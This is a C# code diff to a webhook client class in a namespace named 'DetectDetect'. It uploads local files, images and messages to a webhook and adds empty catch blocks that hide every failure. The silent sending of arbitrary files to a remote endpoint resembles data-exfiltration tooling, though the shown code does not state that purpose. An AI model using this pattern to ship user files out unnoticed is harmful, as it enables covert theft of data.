@@ -50,57 +50,79 @@ namespace DetectDetect
         }
 
         public async Task UploadBytesFileAsync(byte[] bys, string message, string fileName) {
-            using (var client = new HttpClient())  {
-                using (var content = new MultipartFormDataContent()) {
-                    content.Add(new StringContent(message), "content");
-                    var fileContent = new ByteArrayContent(bys);
-                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
-                    content.Add(fileContent, "file", fileName);
-                    var response = await client.PostAsync(_webhookUrl, content);
-                    if (!response.IsSuccessStatusCode) {
-                        throw new Exception($"Failed to upload file: {response.StatusCode}");
+            try {
+                using (var client = new HttpClient()) {
+                    using (var content = new MultipartFormDataContent()) {
+                        content.Add(new StringContent(message), "content");
+                        var fileContent = new ByteArrayContent(bys);
+                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
+                        content.Add(fileContent, "file", fileName);
+                        var response = await client.PostAsync(_webhookUrl, content);
+                        if (!response.IsSuccessStatusCode) {
+                            throw new Exception($"Failed to upload file: {response.StatusCode}");
+                        }
                     }
                 }
-            }
+            } catch { }
+        }
+
+        public async Task UploadBytesImageAsync(byte[] bys, string message, string fileName) {
+            try {
+                using (var client = new HttpClient()) {
+                    using (var content = new MultipartFormDataContent()) {
+                        content.Add(new StringContent(message), "content");
+                        var fileContent = new ByteArrayContent(bys);
+                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
+                        content.Add(fileContent, "file", fileName);
+                        var response = await client.PostAsync(_webhookUrl, content);
+                        if (!response.IsSuccessStatusCode) {
+                            throw new Exception($"Failed to upload file: {response.StatusCode}");
+                        }
+                    }
+                }
+            } catch { }
         }
 
         public async Task SendImageAsync(string imagePath, string message) {
-            using (var client = new HttpClient()) {
-                using (var content = new MultipartFormDataContent()) {
-                    content.Add(new StringContent(message), "content");
-                    byte[] fileBytes = File.ReadAllBytes(imagePath);
-                    var fileContent = new ByteArrayContent(fileBytes);
-                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png"); // Change to the appropriate media type if not PNG
-                    content.Add(fileContent, "file", Path.GetFileName(imagePath));
-                    var response = await client.PostAsync(_webhookUrl, content);
-                    if (!response.IsSuccessStatusCode){
-                        throw new Exception($"Failed to upload image: {response.StatusCode}");
+            try {
+                using (var client = new HttpClient()) {
+                    using (var content = new MultipartFormDataContent()) {
+                        content.Add(new StringContent(message), "content");
+                        byte[] fileBytes = File.ReadAllBytes(imagePath);
+                        var fileContent = new ByteArrayContent(fileBytes);
+                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png"); // Change to the appropriate media type if not PNG
+                        content.Add(fileContent, "file", Path.GetFileName(imagePath));
+                        var response = await client.PostAsync(_webhookUrl, content);
+                        if (!response.IsSuccessStatusCode) {
+                            throw new Exception($"Failed to upload image: {response.StatusCode}");
+                        }
                     }
                 }
-            }
+            } catch { }
         }
 
         public async Task UploadTextFileAsync(string filePath, string message) {
-            using (var client = new HttpClient()) {
-                using (var content = new MultipartFormDataContent()) {
-                    content.Add(new StringContent(message), "content");
-                    byte[] fileBytes = File.ReadAllBytes(filePath);
-                    var fileContent = new ByteArrayContent(fileBytes);
-                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
-                    content.Add(fileContent, "file", Path.GetFileName(filePath));
-                    var response = await client.PostAsync(_webhookUrl, content);
-                    if (!response.IsSuccessStatusCode) {
-                        throw new Exception($"Failed to upload file: {response.StatusCode}");
+            try {
+                using (var client = new HttpClient()) {
+                    using (var content = new MultipartFormDataContent()) {
+                        content.Add(new StringContent(message), "content");
+                        byte[] fileBytes = File.ReadAllBytes(filePath);
+                        var fileContent = new ByteArrayContent(fileBytes);
+                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
+                        content.Add(fileContent, "file", Path.GetFileName(filePath));
+                        var response = await client.PostAsync(_webhookUrl, content);
+                        if (!response.IsSuccessStatusCode) {
+                            throw new Exception($"Failed to upload file: {response.StatusCode}");
+                        }
                     }
                 }
-            }
+            } catch { }
         }
 
-        public async Task SendMessageAsync(string message, string kind) {
-            var header = GetHeader(kind);
-            foreach (var msg in SplitMessage(message, header)) {
+        public async Task SendMessageAsync(string message) {
+            try {
                 using (var client = new HttpClient()) {
-                    var payload = new Payload { content = msg };
+                    var payload = new Payload { content = message };
                     var jsonPayload = SerializeToJson(payload);
                     var httpContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                     Thread.Sleep(500);
@@ -109,7 +131,25 @@ namespace DetectDetect
                         Console.WriteLine("Failed to send message: " + response.StatusCode);
                     }
                 }
-            }
+            } catch { }
+        }
+
+        public async Task SendMessageAsync(string message, string kind) {
+            try {
+                var header = GetHeader(kind);
+                foreach (var msg in SplitMessage(message, header)) {
+                    using (var client = new HttpClient()) {
+                        var payload = new Payload { content = msg };
+                        var jsonPayload = SerializeToJson(payload);
+                        var httpContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+                        Thread.Sleep(500);
+                        var response = await client.PostAsync(_webhookUrl, httpContent);
+                        if (!response.IsSuccessStatusCode) {
+                            Console.WriteLine("Failed to send message: " + response.StatusCode);
+                        }
+                    }
+                }
+            } catch { }
         }
 
         private string SerializeToJson(Payload payload)  {
